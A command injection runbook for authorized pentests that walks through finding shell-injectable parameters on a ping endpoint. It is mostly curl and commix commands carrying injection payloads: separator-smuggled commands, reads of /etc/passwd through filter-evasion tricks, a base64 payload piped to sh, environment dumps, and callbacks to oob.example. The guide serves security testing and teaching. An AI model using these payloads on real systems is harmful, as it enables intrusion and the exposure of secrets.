---
title: "Command Injection"
description: "Detecting and exploiting OS command injection: metacharacters, blind timing checks, out-of-band callbacks, filter evasion, and impact boundaries."
phase: Web
order: 20
tags:
  - command-injection
  - rce
  - injection
  - owasp
tools:
  - burp suite
  - commix
updated: 2026-10-01
---

A command injection runbook for authorized pentests / bug bounty on **in-scope** targets only. Goal: find where user input reaches a shell and prove execution with a harmless marker, then map the impact boundary.

## 1. Map candidate inputs

Anything that shells out is a candidate: ping/traceroute tools, image/PDF converters, backup and export jobs, DNS/WHOIS lookups, filename handling.

```bash
# Fingerprint the app and its stack
curl -s -I "https://target.com/" | grep -i -E 'server|x-powered-by'

# Fuzz a suspected parameter for a delay signal
ffuf -u "https://target.com/ping?host=FUZZ" \
  -w /usr/share/seclists/Fuzzing/command-injection.txt \
  -mc all -fs 0 -t 20
```

## 2. Confirm with a reflection probe

Start with a unique string, then a metacharacter that produces deterministic output.

```bash
# Baseline
curl -s "https://target.com/ping?host=127.0.0.1"

# In-band echo via separators
curl -s "https://target.com/ping?host=127.0.0.1;id"
curl -s "https://target.com/ping?host=127.0.0.1|id"
curl -s "https://target.com/ping?host=127.0.0.1%0aid"
curl -s "https://target.com/ping?host=\$(id)"
curl -s "https://target.com/ping?host=\`id\`"
```

## 3. Blind timing proof

When output is not returned, use a measured delay instead of echo.

```bash
# Baseline timing
time curl -s "https://target.com/ping?host=127.0.0.1" -o /dev/null

# Delay injection (expect ~5s wall time on success)
time curl -s "https://target.com/ping?host=127.0.0.1;sleep 5" -o /dev/null
time curl -s "https://target.com/ping?host=127.0.0.1%7csleep%205" -o /dev/null

# Compare with a control host that should not delay
time curl -s "https://target.com/ping?host=127.0.0.1;ping -c 5 127.0.0.1" -o /dev/null
```

## 4. Out-of-band confirmation

Blind results often mislead; verify with a callback you control.

```bash
# Start a listener on your VPS / collaborator domain
# commix can drive the whole interaction
commix --url="https://target.com/ping?host=127.0.0.1" --batch --level=3

# Manual OOB via DNS and HTTP
interakt dns --data "host=127.0.0.1;nslookup \$RANDOM.oob.example"
interakt http --data "host=127.0.0.1;curl http://oob.example/cb"
```

## 5. Filter and whitespace evasion

If separators are stripped, vary encoding, quoting, and newlines before giving up.

```bash
# Newline-separated commands
curl -s "https://target.com/ping?host=127.0.0.1%0Aid%0A"

# IFS / brace expansion to defeat naive space stripping
curl -s "https://target.com/ping?host=127.0.0.1;cat\${IFS}/etc/passwd"
curl -s "https://target.com/ping?host=127.0.0.1;{cat,/etc/passwd}"

# Base64-encoded payload executed via shell
curl -s "https://target.com/ping?host=127.0.0.1;echo\${IFS}Y2F0IC9ldGMvcGFzc3dk|base64\${IFS}-d|sh"
```

## 6. Establish the impact boundary

Prove what the process can reach rather than stopping at `id`.

```bash
curl -s "https://target.com/ping?host=127.0.0.1;id;hostname;uname -a"
curl -s "https://target.com/ping?host=127.0.0.1;env"
curl -s "https://target.com/ping?host=127.0.0.1;cat /etc/hostname;ls -la /"
```

## Full pipeline

```bash
# 1. Fingerprint and fuzz a candidate parameter
curl -s -I "https://target.com/" | grep -i -E 'server|x-powered-by'
ffuf -u "https://target.com/ping?host=FUZZ" -w /usr/share/seclists/Fuzzing/command-injection.txt -mc all -fs 0 -t 20

# 2. In-band confirmation
curl -s "https://target.com/ping?host=127.0.0.1;id"
curl -s "https://target.com/ping?host=127.0.0.1|id"

# 3. Blind timing proof with a control
time curl -s "https://target.com/ping?host=127.0.0.1;sleep 5" -o /dev/null

# 4. Automated confirmation and OOB
commix --url="https://target.com/ping?host=127.0.0.1" --batch --level=3
interakt dns --data "host=127.0.0.1;nslookup \$RANDOM.oob.example"

# 5. Impact boundary
curl -s "https://target.com/ping?host=127.0.0.1;id;hostname;uname -a;env"
```

## Ethics & legality

- Only test parameters and endpoints listed in the program scope or written authorization.
- Use harmless markers (`id`, `sleep`, a callback to your own host) — never weaponized payloads.
- Respect rate limits and avoid denial-of-service style payloads.
- Log every request with timestamp and target as evidence for the report.
